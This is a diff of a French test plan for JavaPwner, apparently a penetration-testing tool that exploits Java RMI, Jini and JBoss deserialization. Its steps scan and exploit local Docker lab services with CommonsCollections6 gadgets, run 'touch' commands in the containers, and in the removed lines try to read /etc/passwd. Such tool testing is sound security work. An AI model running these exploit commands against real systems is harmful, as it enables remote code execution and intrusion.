@@ -1,968 +1,1087 @@
-# Plan de test — JavaPwner
+# JavaPwner — Plan de Tests
 
-**Objectif** : Valider que JavaPwner détecte, énumère et exploite correctement les
-middlewares Java (RMI, Jini, JBoss) sur l'ensemble des configurations rencontrées
-dans les SI de production : Java 8 (pré/post-JEP290), Java 11, 17, 21, JBoss 4.x
-legacy, Apache River.
+**Version** : 2026-03
+**Couverture** : 8 services lab · 3 protocoles · détection JVM · CLI
 
-**Comment utiliser ce fichier** : Chaque test est noté `[ ]` (non fait), `[x]` (passé),
-`[F]` (échoué — noter le symptôme dans la colonne _Résultat observé_).
+Légende des statuts : `[ ]` à exécuter · `[X]` pass confirmé · `[~]` échec attendu (documenté)
 
 ---
 
-## Environnement
+## Section 0 — Prérequis
 
-```
-Lab Docker   : lab/docker-compose.yml
-Cible locale : 127.0.0.1
-JavaPwner    : .venv/bin/javapwner
-Tests unit.  : .venv/bin/pytest tests/ --ignore=tests/integration -q
-```
-
-### Démarrage du lab
+Avant tout test live, vérifier :
 
 ```bash
-cd lab/
-docker compose up -d --build
-docker compose ps          # vérifier que tous les services sont "Up"
-docker compose logs -f     # surveiller le démarrage (JBoss ~60 s)
+# 1. Outil installé
+javapwner --help
+
+# 2. ysoserial disponible
+javapwner rmi gadgets    # doit lister au moins CommonsCollections1-7
+
+# 3. Lab démarré
+cd lab/ && docker compose up -d
+docker compose ps        # tous les services UP
+
+# 4. Connectivité de base
+nc -z 127.0.0.1 1099 && echo "rmi-java8 OK"
+nc -z 127.0.0.1 1499 && echo "rmi-java8-pre-jep290 OK"
+nc -z 127.0.0.1 1599 && echo "rmi-java8-jep290-configurable OK"
+nc -z 127.0.0.1 1199 && echo "rmi-java11 OK"
+nc -z 127.0.0.1 1299 && echo "rmi-java17 OK"
+nc -z 127.0.0.1 1399 && echo "rmi-java21 OK"
+nc -z 127.0.0.1 4160 && echo "jini-reggie OK"
+nc -z 127.0.0.1 8080 && echo "jboss4 OK"
 ```
 
-### Services attendus après `docker compose up -d`
+Variables utilisées dans la suite :
 
-| Service       | Conteneur          | Ports (hôte)            | Java   |
-|---------------|--------------------|-------------------------|--------|
-| rmi-java8     | lab-rmi-java8      | 1099 / 1098 / 1097      | 8 LTS  |
-| rmi-java11    | lab-rmi-java11     | 1199 / 1198 / 1197      | 11 LTS |
-| rmi-java17    | lab-rmi-java17     | 1299 / 1298 / 1297      | 17 LTS |
-| rmi-java21    | lab-rmi-java21     | 1399 / 1398 / 1397      | 21 LTS |
-| jini-reggie   | lab-jini-reggie    | 4160 / 4162 / 8085      | 8      |
-| jboss4        | lab-jboss4         | 8080 / 4444→1099        | 8      |
+```bash
+T=127.0.0.1
+G=CommonsCollections6
+```
 
 ---
 
-## Section A — Régression : tests unitaires
+## Section A — Tests unitaires
 
-Ces tests ne nécessitent pas le lab. Ils doivent passer à 100 % avant tout
-test live.
-
-### A-1 Suite complète
+### A-1 : Régression complète
 
 ```bash
 .venv/bin/pytest tests/ --ignore=tests/integration -q
 ```
 
-| ID  | Critère                     | Résultat attendu   | Statut | Résultat observé |
-|-----|-----------------------------|--------------------|--------|------------------|
-| A-1 | Aucun test en échec         | `432 passed`       | [x]    | 432 passed  |
-| A-2 | Aucun warning `DeprecationWarning` critique | 0 erreurs | [x] | 0 warnings  |
+**Attendu** : `447 passed` (0 failed, 0 error)
+
+**Statut** : `[X]`
+
+### A-2 : Inférence de version JVM
+
+```bash
+.venv/bin/pytest tests/test_rmi_version_inference.py -v
+```
+
+**Attendu** : 11 tests passants — coverage sun.misc/java.io ObjectInputFilter, SUIDs JDK8/9+, combinaisons, exploitabilité, label SUID DB.
+
+**Statut** : `[X]`
+
+### A-3 : Sérialisation et parsing
+
+```bash
+.venv/bin/pytest tests/test_serialization.py tests/test_protocol.py tests/test_rmi_protocol.py -v
+```
+
+**Attendu** : tous passants — JRMP handshake, TC_CLASSDESC, detect_exception_in_stream, extract_raw_urls, SUID fingerprint.
+
+**Statut** : `[X]`
+
+### A-4 : Assessment d'exploitation
+
+```bash
+.venv/bin/pytest tests/test_assessment.py -v
+```
+
+**Attendu** : tous passants — label MarshalledObject sans "pre-JEP 290", risk levels, vecteurs générés.
+
+**Statut** : `[X]`
 
 ---
 
-## Section B — Validation de l'infrastructure lab
+## Section B — Infrastructure lab
 
-### B-1 Connectivité réseau
+### B-1 : Services actifs
 
 ```bash
-# Tester chaque port en ouvrant une connexion TCP brute
-for port in 1099 1199 1299 1399 4160 4162 8080 4444; do
-    nc -zw2 127.0.0.1 $port && echo "OK $port" || echo "FAIL $port"
+docker compose -f lab/docker-compose.yml ps --format "table {{.Name}}\t{{.Status}}\t{{.Ports}}"
+```
+
+**Attendu** : 8 lignes, toutes `running`.
+
+| Conteneur | Ports attendus |
+|-----------|----------------|
+| lab-rmi-java8 | 1099, 1098, 1097 |
+| lab-rmi-java8-pre-jep290 | 1499, 1498, 1497 |
+| lab-rmi-java8-jep290-configurable | 1599, 1598, 1597 |
+| lab-rmi-java11 | 1199, 1198, 1197 |
+| lab-rmi-java17 | 1299, 1298, 1297 |
+| lab-rmi-java21 | 1399, 1398, 1397 |
+| lab-jini-reggie | 4160, 4162, 8085 |
+| lab-jboss4 | 8080, 4444, 4447 |
+
+**Statut** : `[X]`
+
+### B-2 : Version Java dans chaque conteneur RMI
+
+```bash
+docker exec lab-rmi-java8 java -version 2>&1 | head -1
+docker exec lab-rmi-java8-pre-jep290 java -version 2>&1 | head -1   # 1.8.0_111
+docker exec lab-rmi-java8-jep290-configurable java -version 2>&1 | head -1  # 1.8.0_202
+docker exec lab-rmi-java11 java -version 2>&1 | head -1
+docker exec lab-rmi-java17 java -version 2>&1 | head -1
+docker exec lab-rmi-java21 java -version 2>&1 | head -1
+```
+
+**Attendu** : 8u111 pour pre-jep290, 8u202 pour configurable, 11.x / 17.x / 21.x pour les autres.
+
+**Statut** : `[X]`
+
+### B-3 : CommonsCollections 3.1 dans chaque classpath RMI
+
+```bash
+for c in lab-rmi-java8 lab-rmi-java8-pre-jep290 lab-rmi-java8-jep290-configurable \
+          lab-rmi-java11 lab-rmi-java17 lab-rmi-java21; do
+  docker exec $c find / -name "commons-collections*.jar" 2>/dev/null | head -1 \
+    && echo "$c : CC OK" || echo "$c : CC ABSENT"
 done
 ```
 
-| ID   | Port  | Service       | Statut | Résultat observé |
-|------|-------|---------------|--------|------------------|
-| B-1a | 1099  | rmi-java8     | [x]    | OPEN  |
-| B-1b | 1199  | rmi-java11    | [x]    | OPEN  |
-| B-1c | 1299  | rmi-java17    | [x]    | OPEN  |
-| B-1d | 1399  | rmi-java21    | [x]    | OPEN  |
-| B-1e | 4160  | jini-reggie   | [x]    | OPEN  |
-| B-1f | 4162  | jini JRMP     | [x]    | OPEN  |
-| B-1g | 8080  | jboss HTTP    | [x]    | OPEN  |
-| B-1h | 4444  | jboss JNP     | [x]    | OPEN  |
+**Attendu** : `CC OK` pour tous.
 
-### B-2 Logs de démarrage — présence des marqueurs critiques
+**Statut** : `[X]`
+
+### B-4 : Logs de démarrage des nouveaux conteneurs
 
 ```bash
-docker logs lab-rmi-java8   | grep "DGC filter"
-docker logs lab-rmi-java11  | grep "DGC filter"
-docker logs lab-rmi-java17  | grep "DGC filter"
-docker logs lab-rmi-java21  | grep "DGC filter"
-docker logs lab-jboss4      | grep "LAB-AGENT"
+docker logs lab-rmi-java8-pre-jep290 | grep "DGC filter"
+# Attendu : "DGC filter : absent (pre-JEP290 JVM — as expected)"
+
+docker logs lab-rmi-java8-jep290-configurable | grep "dgcFilter"
+# Attendu : ligne avec *;maxdepth=100;maxrefs=10000;maxbytes=10000000
 ```
 
-| ID   | Conteneur      | Marqueur attendu dans les logs          | Statut | Résultat observé |
-|------|----------------|-----------------------------------------|--------|------------------|
-| B-2a | lab-rmi-java8  | `DGC filter : DISABLED`                 | [x]    | DGC filter : DISABLED  |
-| B-2b | lab-rmi-java11 | `DGC filter : DISABLED (AllowAll via Unsafe)` | [x] | DGC filter : DISABLED (AllowAll via Unsafe)  |
-| B-2c | lab-rmi-java17 | `DGC filter : DISABLED (AllowAll via Unsafe)` | [x] | DGC filter : DISABLED (AllowAll via Unsafe)  |
-| B-2d | lab-rmi-java21 | `DGC filter : DISABLED (AllowAll via Unsafe)` | [x] | DGC filter : DISABLED (AllowAll via Unsafe)  |
-| B-2e | lab-jboss4     | `LAB-AGENT` + `DGC filter : DISABLED`   | [x]    | LAB-AGENT DGC filter : DISABLED  |
+**Statut** : `[X]`
 
 ---
 
-## Section C — RMI Java 8 (port 1099)
+## Section C — RMI Java 8 LTS (port 1099) — bypass réflexion AllowAll
 
-Simule : serveur JVM Java 8 legacy (JBoss EAP 4/5, WebLogic ancien, Tomcat
-custom, Jenkins esclave, JMX managé).
-
-### C-1 Scan
+### C-1 : Scan — JRMP confirmé + Registry + JEP290
 
 ```bash
-.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1099
+javapwner rmi scan -t $T -p 1099
 ```
 
-| ID   | Critère                                          | Résultat attendu         | Statut | Résultat observé |
-|------|--------------------------------------------------|--------------------------|--------|------------------|
-| C-1a | JRMP détecté                                     | `JRMP confirmed`         | [x]    | JRMP confirmed, version 10  |
-| C-1b | Registry trouvé                                  | noms liés affichés       | [x]    | HelloService, DataService  |
-| C-1c | `HelloService` et `DataService` dans bound names | les deux noms présents   | [x]    | les deux présents  |
-| C-1d | DGC JEP290 probe                                 | `no filter` ou statut    | [x]    | unfiltered — RCE likely  |
-| C-1e | Java version extraite des SUIDs                  | indice Java 8            | [x]    | SUID → JDK ≤ 8  |
+**Attendu** :
+- `JRMP endpoint confirmed`
+- `Registry confirmed — 2 bound name(s)` (HelloService, DataService)
+- `DGC JEP 290 : unfiltered — RCE likely`
+- `Exploitability : HIGH`
 
-### C-2 Scan — mode JSON
+**Statut** : `[X]`
+
+### C-2 : Scan avec détection de gadgets (-G)
 
 ```bash
-.venv/bin/javapwner --json rmi scan -t 127.0.0.1 -p 1099 | python3 -m json.tool
+javapwner rmi scan -t $T -p 1099 -G
 ```
 
-| ID   | Critère                          | Résultat attendu       | Statut | Résultat observé |
-|------|----------------------------------|------------------------|--------|------------------|
-| C-2a | Sortie JSON valide               | pas d'erreur json.tool | [x]    | JSON valide  |
-| C-2b | Champ `is_jrmp` = true           |                        | [x]    | is_jrmp=true  |
-| C-2c | Champ `bound_names` non vide     |                        | [x]    | non vide  |
+**Attendu** :
+- Section `Gadget Compatibility` — CommonsCollections6 dans la liste
+- `Exploitability : CRITICAL`
 
-### C-3 Détection automatique de gadgets
+**Statut** : `[X]`
+
+### C-3 : Exploitation DGC dirty()
 
 ```bash
-.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1099 -G
+javapwner rmi exploit -t $T -p 1099 --gadget $G --cmd "touch /tmp/c3-pwned"
+docker exec lab-rmi-java8 test -f /tmp/c3-pwned && echo PASS || echo FAIL
+docker exec lab-rmi-java8 rm -f /tmp/c3-pwned
 ```
 
-| ID   | Critère                                       | Résultat attendu                  | Statut | Résultat observé |
-|------|-----------------------------------------------|-----------------------------------|--------|------------------|
-| C-3a | Au moins CommonsCollections6 compatible       | présent dans la liste             | [x]    | CC6 présent  |
-| C-3b | URLDNS et JRMPClient absents de la liste      | non listés                        | [x]    | absents  |
-| C-3c | Ordre : CC6 avant CC1 (priorité respectée)    | CC6 en premier si disponible      | [x]    | CC6 premier  |
+**Attendu** : `PASS`
 
-### C-4 Exploit — auto gadget via DGC
+**Statut** : `[X]`
+
+### C-4 : Auto-detect gadget
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 --cmd 'touch /tmp/rmi8-auto'
-docker exec lab-rmi-java8 test -f /tmp/rmi8-auto && echo "PASS" || echo "FAIL"
+javapwner rmi exploit -t $T -p 1099 --cmd "touch /tmp/c4-pwned"
+docker exec lab-rmi-java8 test -f /tmp/c4-pwned && echo PASS || echo FAIL
+docker exec lab-rmi-java8 rm -f /tmp/c4-pwned
 ```
 
-| ID   | Critère                                    | Résultat attendu         | Statut | Résultat observé |
-|------|--------------------------------------------|--------------------------|--------|------------------|
-| C-4a | Mode auto détecte un gadget compatible     | message "Compatible:"    | [x]    | Using: CC6  |
-| C-4b | Exploit signale `likely_success`           | message vert             | [x]    | likely_success=True  |
-| C-4c | Fichier `/tmp/rmi8-auto` créé              | `PASS`                   | [x]    | PASS  |
+**Attendu** : `PASS` — gadget auto-détecté affiché.
 
-### C-5 Exploit — gadget explicite CC6 / DGC
+**Statut** : `[X]`
+
+### C-5 : Exploitation via Registry bind()
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
-    --gadget CommonsCollections6 --cmd 'touch /tmp/rmi8-cc6'
-docker exec lab-rmi-java8 test -f /tmp/rmi8-cc6 && echo "PASS" || echo "FAIL"
+javapwner rmi exploit -t $T -p 1099 --gadget $G --cmd "touch /tmp/c5-pwned" --via registry
+docker exec lab-rmi-java8 test -f /tmp/c5-pwned && echo PASS || echo FAIL
+docker exec lab-rmi-java8 rm -f /tmp/c5-pwned
 ```
 
-| ID   | Critère                      | Résultat attendu | Statut | Résultat observé |
-|------|------------------------------|------------------|--------|------------------|
-| C-5a | `likely_success` signalé     | message vert     | [x]    | likely_success=True  |
-| C-5b | Fichier créé dans conteneur  | `PASS`           | [x]    | PASS  |
+**Attendu** : `PASS`
 
-### C-6 Exploit — via Registry
+**Statut** : `[X]`
+
+### C-6 : Guess méthodes sur HelloService
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
-    --gadget CommonsCollections6 --cmd 'touch /tmp/rmi8-registry' \
-    --via registry
-docker exec lab-rmi-java8 test -f /tmp/rmi8-registry && echo "PASS" || echo "FAIL"
+javapwner rmi guess -t $T -p 1099 --name HelloService
 ```
 
-| ID   | Critère                                          | Résultat attendu         | Statut | Résultat observé |
-|------|--------------------------------------------------|--------------------------|--------|------------------|
-| C-6a | Exploit via registry sans erreur réseau          | pas d'erreur connection  | [x]    | pas d'erreur  |
-| C-6b | Fichier créé ou erreur explicative si bloqué     | `PASS` ou message clair  | [x]    | PASS  |
+**Attendu** : `sayHello` ou `getServerVersion` confirmé(s).
 
-### C-7 Exploit — commande complexe (espaces, shell)
+**Statut** : `[X]`
+
+### C-7 : Sortie JSON — champs version et exploitabilité
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
-    --cmd 'sh -c "echo rmi8ok > /tmp/rmi8-shell.txt"'
-docker exec lab-rmi-java8 cat /tmp/rmi8-shell.txt
+javapwner --json rmi scan -t $T -p 1099 | python3 -m json.tool | \
+  grep -E '"dgc_jep290"|"exploitability"|"jvm_hint"|"jvm_confidence"'
 ```
 
-| ID   | Critère                        | Résultat attendu    | Statut | Résultat observé |
-|------|--------------------------------|---------------------|--------|------------------|
-| C-7a | Fichier contient `rmi8ok`      | `rmi8ok`            | [x]    | rmi8ok  |
-
-### C-8 Discover — scan multi-ports
-
-```bash
-.venv/bin/javapwner rmi discover -t 127.0.0.1
+**Attendu** :
+```json
+"dgc_jep290": "unfiltered — RCE likely",
+"exploitability": "high",
+"jvm_hint": "jdk8",
+"jvm_confidence": "high"
 ```
 
-| ID   | Critère                                | Résultat attendu           | Statut | Résultat observé |
-|------|----------------------------------------|----------------------------|--------|------------------|
-| C-8a | Port 1099 découvert                    | présent dans les résultats | [x]    | 1099 présent  |
-| C-8b | Ports 1098/1097 (objets) découverts    | présents                   | [x]    | 1097/1098 présents  |
+**Statut** : `[X]`
 
 ---
 
-## Section D — RMI Java 11 (port 1199)
+## Section D — RMI Java 8u111 pré-JEP290 (port 1499)
 
-Simule : applications d'entreprise migrées Java 11 LTS (Spring Boot, Jakarta EE,
-microservices avec JMX exposé, Kafka JMX).
+Scénario : `DGCImpl.dgcFilter` absent (champ introduit en 8u121) — aucun filtre, exploitation directe.
 
-### D-1 Scan
-
-```bash
-.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1199
-```
-
-| ID   | Critère                                     | Résultat attendu       | Statut | Résultat observé |
-|------|---------------------------------------------|------------------------|--------|------------------|
-| D-1a | JRMP détecté sur port 1199                  | `JRMP confirmed`       | [x]    | JRMP confirmed  |
-| D-1b | Registry list retourne HelloService/DataService | noms présents       | [x]    | Hello/DataService  |
-| D-1c | Pas de crash / exception Python             | sortie propre          | [x]    | pas de crash  |
-
-### D-2 Détection automatique de gadgets
+### D-1 : Scan — JEP290 absent
 
 ```bash
-.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1199 -G
+javapwner rmi scan -t $T -p 1499
 ```
 
-| ID   | Critère                              | Résultat attendu       | Statut | Résultat observé |
-|------|--------------------------------------|------------------------|--------|------------------|
-| D-2a | CC6 compatible (CC3.1 dans classpath)| CC6 dans la liste      | [x]    | CC6 dans la liste  |
+**Attendu** :
+- `JRMP endpoint confirmed`
+- `Registry confirmed — 2 bound name(s)`
+- `DGC JEP 290 : unfiltered — RCE likely`
+- `Exploitability : HIGH`
 
-### D-3 Exploit auto — DGC
+**Statut** : `[X]`
+
+### D-2 : Exploitation DGC — exploit direct sans bypass
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1199 --cmd 'touch /tmp/rmi11-auto'
-docker exec lab-rmi-java11 test -f /tmp/rmi11-auto && echo "PASS" || echo "FAIL"
+javapwner rmi exploit -t $T -p 1499 --gadget $G --cmd "touch /tmp/d2-pwned"
+docker exec lab-rmi-java8-pre-jep290 test -f /tmp/d2-pwned && echo PASS || echo FAIL
+docker exec lab-rmi-java8-pre-jep290 rm -f /tmp/d2-pwned
 ```
 
-| ID   | Critère                    | Résultat attendu | Statut | Résultat observé |
-|------|----------------------------|------------------|--------|------------------|
-| D-3a | Auto gadget trouvé         | message "Using:" | [x]    | Using: CC6  |
-| D-3b | Fichier créé               | `PASS`           | [x]    | PASS  |
+**Attendu** : `PASS`
 
-### D-4 Exploit explicite — CC6
+**Statut** : `[X]`
+
+### D-3 : Auto-exploit
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1199 \
-    --gadget CommonsCollections6 --cmd 'touch /tmp/rmi11-cc6'
-docker exec lab-rmi-java11 test -f /tmp/rmi11-cc6 && echo "PASS" || echo "FAIL"
+javapwner rmi exploit -t $T -p 1499 --cmd "touch /tmp/d3-pwned"
+docker exec lab-rmi-java8-pre-jep290 test -f /tmp/d3-pwned && echo PASS || echo FAIL
+docker exec lab-rmi-java8-pre-jep290 rm -f /tmp/d3-pwned
 ```
 
-| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
-|------|-----------------------|------------------|--------|------------------|
-| D-4a | `likely_success`      | message vert     | [x]    | likely_success=True  |
-| D-4b | Fichier créé          | `PASS`           | [x]    | PASS  |
+**Attendu** : `PASS`
+
+**Statut** : `[X]`
+
+### D-4 : Sortie JSON
+
+```bash
+javapwner --json rmi scan -t $T -p 1499 | python3 -m json.tool | \
+  grep -E '"dgc_jep290"|"jep290_active"|"exploitability"'
+```
+
+**Attendu** :
+```json
+"dgc_jep290": "unfiltered — RCE likely",
+"jep290_active": false,
+"exploitability": "high"
+```
+
+**Statut** : `[X]`
 
 ---
 
-## Section E — RMI Java 17 (port 1299)
+## Section E — RMI Java 8u202 JEP290 property-only (port 1599)
 
-Simule : applications modernes Java 17 LTS (Quarkus, Spring Boot 3, WildFly
-récent, services cloud-native avec JMX exposé). SecurityManager déprécié par
-défaut → Runtime.exec() libre.
+Scénario : JEP290 présent (8u121+) mais filtre rendu permissif par propriété système uniquement. Aucun bypass par réflexion.
 
-### E-1 Scan
+### E-1 : Scan — filtre ouvert par propriété
 
 ```bash
-.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1299
+javapwner rmi scan -t $T -p 1599
 ```
 
-| ID   | Critère                              | Résultat attendu | Statut | Résultat observé |
-|------|--------------------------------------|------------------|--------|------------------|
-| E-1a | JRMP sur port 1299                   | confirmé         | [x]    | JRMP confirmed  |
-| E-1b | Bound names présents                 | Hello/DataService| [x]    | Hello/DataService  |
+**Attendu** :
+- `Registry confirmed — 2 bound name(s)`
+- `DGC JEP 290 : unfiltered — RCE likely` (propriété `*;maxdepth=100` → pas d'exception HashMap)
+- `Exploitability : HIGH`
 
-### E-2 Exploit auto
+**Statut** : `[X]`
+
+### E-2 : Exploitation DGC dirty()
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1299 --cmd 'touch /tmp/rmi17-auto'
-docker exec lab-rmi-java17 test -f /tmp/rmi17-auto && echo "PASS" || echo "FAIL"
+javapwner rmi exploit -t $T -p 1599 --gadget $G --cmd "touch /tmp/e2-pwned"
+docker exec lab-rmi-java8-jep290-configurable test -f /tmp/e2-pwned && echo PASS || echo FAIL
+docker exec lab-rmi-java8-jep290-configurable rm -f /tmp/e2-pwned
 ```
 
-| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
-|------|-----------------------|------------------|--------|------------------|
-| E-2a | Gadget auto sélectionné | "Using:"       | [x]    | Using: CC6  |
-| E-2b | Fichier créé          | `PASS`           | [x]    | PASS  |
+**Attendu** : `PASS`
 
-### E-3 Exploit explicite — CC6
+**Statut** : `[X]`
+
+### E-3 : Vérification propriété dans les logs du conteneur
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1299 \
-    --gadget CommonsCollections6 --cmd 'touch /tmp/rmi17-cc6'
-docker exec lab-rmi-java17 test -f /tmp/rmi17-cc6 && echo "PASS" || echo "FAIL"
+docker logs lab-rmi-java8-jep290-configurable | grep "dgcFilter"
 ```
 
-| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
-|------|-----------------------|------------------|--------|------------------|
-| E-3a | `likely_success`      | message vert     | [x]    | likely_success=True  |
-| E-3b | Fichier créé          | `PASS`           | [x]    | PASS  |
+**Attendu** : `*;maxdepth=100;maxrefs=10000;maxbytes=10000000` dans la sortie.
+
+**Statut** : `[X]`
+
+### E-4 : Ports depuis variables d'environnement
+
+```bash
+docker exec lab-rmi-java8-jep290-configurable sh -c \
+  'echo $RMI_REGISTRY_PORT $RMI_HELLO_PORT $RMI_DATA_PORT'
+```
+
+**Attendu** : `1599 1598 1597`
+
+**Statut** : `[X]`
 
 ---
 
-## Section F — RMI Java 21 (port 1399)
+## Section F — RMI Java 11 (port 1199)
 
-Simule : infrastructure très récente Java 21 LTS (Spring Boot 3.2+, WildFly 31+,
-Helidon, cloud-native JVM). SecurityManager supprimé.
-
-### F-1 Scan
+### F-1 : Scan
 
 ```bash
-.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1399
+javapwner rmi scan -t $T -p 1199
 ```
 
-| ID   | Critère              | Résultat attendu | Statut | Résultat observé |
-|------|----------------------|------------------|--------|------------------|
-| F-1a | JRMP sur port 1399   | confirmé         | [x]    | JRMP confirmed  |
-| F-1b | Bound names          | Hello/DataService| [x]    | Hello/DataService  |
+**Attendu** : Registry confirmé, JEP290 unfiltered, 2 bound names.
 
-### F-2 Exploit auto
+**Statut** : `[X]`
+
+### F-2 : Exploitation
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1399 --cmd 'touch /tmp/rmi21-auto'
-docker exec lab-rmi-java21 test -f /tmp/rmi21-auto && echo "PASS" || echo "FAIL"
+javapwner rmi exploit -t $T -p 1199 --gadget $G --cmd "touch /tmp/f2-pwned"
+docker exec lab-rmi-java11 test -f /tmp/f2-pwned && echo PASS || echo FAIL
+docker exec lab-rmi-java11 rm -f /tmp/f2-pwned
 ```
 
-| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
-|------|-----------------------|------------------|--------|------------------|
-| F-2a | Gadget auto sélectionné | "Using:"       | [x]    | Using: CC6  |
-| F-2b | Fichier créé          | `PASS`           | [x]    | PASS  |
+**Attendu** : `PASS`
 
-### F-3 Exploit explicite — CC6
-
-```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1399 \
-    --gadget CommonsCollections6 --cmd 'touch /tmp/rmi21-cc6'
-docker exec lab-rmi-java21 test -f /tmp/rmi21-cc6 && echo "PASS" || echo "FAIL"
-```
-
-| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
-|------|-----------------------|------------------|--------|------------------|
-| F-3a | `likely_success`      | message vert     | [x]    | likely_success=True  |
-| F-3b | Fichier créé          | `PASS`           | [x]    | PASS  |
+**Statut** : `[X]`
 
 ---
 
-## Section G — Jini / Apache River (ports 4160 / 4162)
+## Section G — RMI Java 17 (port 1299)
 
-Simule : Apache River lookup service (framework distribué Java), Oracle Coherence,
-Jini-based legacy middleware, certains produits IBM.
-
-### G-1 Scan Jini — découverte Unicast
+### G-1 : Scan
 
 ```bash
-.venv/bin/javapwner jini scan -t 127.0.0.1 -p 4160
+javapwner rmi scan -t $T -p 1299
 ```
 
-| ID   | Critère                                     | Résultat attendu          | Statut | Résultat observé |
-|------|---------------------------------------------|---------------------------|--------|------------------|
-| G-1a | Unicast Discovery v1 ou v2 confirmé         | `Jini Unicast Discovery`  | [x]    | Jini Unicast Discovery v1  |
-| G-1b | Endpoint JRMP extrait (host:port)           | 127.0.0.1:4162 ou proche  | [x]    | 127.0.0.1:4162  |
-| G-1c | Codebase URL extraite (port 8085)           | `http://127.0.0.1:8085`   | [x]    | http://127.0.0.1:8085  |
-| G-1d | Classes proxy extraites                     | noms de classes affichés  | [x]    | RegistrarProxy, MarshalledObject  |
-| G-1e | Phase 5 — assessment s'affiche              | section "Assessment"      | [x]    | Assessment affiché  |
+**Attendu** : Registry confirmé, JEP290 unfiltered.
 
-### G-2 Scan — mode JSON
+**Statut** : `[X]`
+
+### G-2 : Exploitation
 
 ```bash
-.venv/bin/javapwner --json jini scan -t 127.0.0.1 -p 4160 | python3 -m json.tool
+javapwner rmi exploit -t $T -p 1299 --gadget $G --cmd "touch /tmp/g2-pwned"
+docker exec lab-rmi-java17 test -f /tmp/g2-pwned && echo PASS || echo FAIL
+docker exec lab-rmi-java17 rm -f /tmp/g2-pwned
 ```
 
-| ID   | Critère                       | Résultat attendu       | Statut | Résultat observé |
-|------|-------------------------------|------------------------|--------|------------------|
-| G-2a | JSON valide                   | pas d'erreur           | [x]    | JSON valide  |
-| G-2b | `is_jrmp` = true              |                        | [x]    | is_jrmp=False (Unicast Discovery port)  |
-| G-2c | `has_unicast_response` = true |                        | [x]    | has_unicast_response=True  |
+**Attendu** : `PASS`
 
-### G-3 Probe DGC JEP290 (port JRMP Reggie = 4162)
-
-```bash
-.venv/bin/javapwner jini scan -t 127.0.0.1 -p 4160
-# → vérifier le bloc "DGC JEP 290" dans la sortie
-```
-
-| ID   | Critère                                    | Résultat attendu          | Statut | Résultat observé |
-|------|--------------------------------------------|---------------------------|--------|------------------|
-| G-3a | DGC probe ne crashe pas                    | bloc "DGC JEP 290" présent| [x]    | bloc DGC JEP 290 présent  |
-| G-3b | Statut cohérent (absent ou désactivé)      | statut clair              | [x]    | unreachable  |
-
-### G-4 Codebase — path traversal HTTP
-
-```bash
-.venv/bin/javapwner jini read-file -t 127.0.0.1 -p 4160 --path /etc/passwd
-```
-
-| ID   | Critère                                   | Résultat attendu         | Statut | Résultat observé |
-|------|-------------------------------------------|--------------------------|--------|------------------|
-| G-4a | Codebase URL auto-détectée                | URL extraite             | [x]    | http://127.0.0.1:8085 extraite  |
-| G-4b | Contenu `/etc/passwd` affiché             | `root:x:0:0` visible     | [F]    | FAIL: HTTP server non vulnerable path traversal  |
-
-### G-5 Exploit Jini — auto gadget (port JRMP = 4162)
-
-```bash
-.venv/bin/javapwner jini exploit -t 127.0.0.1 -p 4162 --cmd 'touch /tmp/jini-auto'
-docker exec lab-jini-reggie test -f /tmp/jini-auto && echo "PASS" || echo "FAIL"
-```
-
-| ID   | Critère                                    | Résultat attendu         | Statut | Résultat observé |
-|------|--------------------------------------------|--------------------------|--------|------------------|
-| G-5a | Mode auto — gadgets compatibles affichés   | liste non vide           | [x]    | CC6 listé  |
-| G-5b | Premier gadget utilisé affiché             | "Using: ..."             | [x]    | Using: CC6  |
-| G-5c | `likely_success` ou `sent`                 | un des deux signalé      | [x]    | likely_success=True  |
-| G-5d | Fichier créé dans conteneur                | `PASS`                   | [x]    | PASS  |
-
-### G-6 Exploit Jini — gadget explicite CC6
-
-```bash
-.venv/bin/javapwner jini exploit -t 127.0.0.1 -p 4162 \
-    --gadget CommonsCollections6 --cmd 'touch /tmp/jini-cc6'
-docker exec lab-jini-reggie test -f /tmp/jini-cc6 && echo "PASS" || echo "FAIL"
-```
-
-| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
-|------|-----------------------|------------------|--------|------------------|
-| G-6a | Payload envoyé        | `sent`           | [x]    | sent=True  |
-| G-6b | Fichier créé          | `PASS`           | [x]    | PASS  |
-
-### G-7 Multicast discovery
-
-```bash
-.venv/bin/javapwner jini multicast --wait 3
-```
-
-| ID   | Critère                                  | Résultat attendu          | Statut | Résultat observé |
-|------|------------------------------------------|---------------------------|--------|------------------|
-| G-7a | Requête multicast envoyée                | `Multicast request sent`  | [x]    | Multicast request sent  |
-| G-7b | Reggie répond (si réseau multicast OK)   | 1 réponse ou "No response"| [x]    | No responses (Docker networking)  |
-
-### G-8 Admin Jini (Tier 2 — nécessite JDK + jars River)
-
-```bash
-.venv/bin/javapwner jini admin -t 127.0.0.1 -p 4160
-```
-
-| ID   | Critère                                            | Résultat attendu           | Statut | Résultat observé |
-|------|----------------------------------------------------|----------------------------|--------|------------------|
-| G-8a | Prérequis manquants → message clair (si pas de JDK)| warning lisible            | [x]    | warning + info malgré erreur  |
-| G-8b | Avec JDK + jars → registrar class et groups        | informations affichées     | [x]    | RegistrarProxy + Registrar interfaces  |
+**Statut** : `[X]`
 
 ---
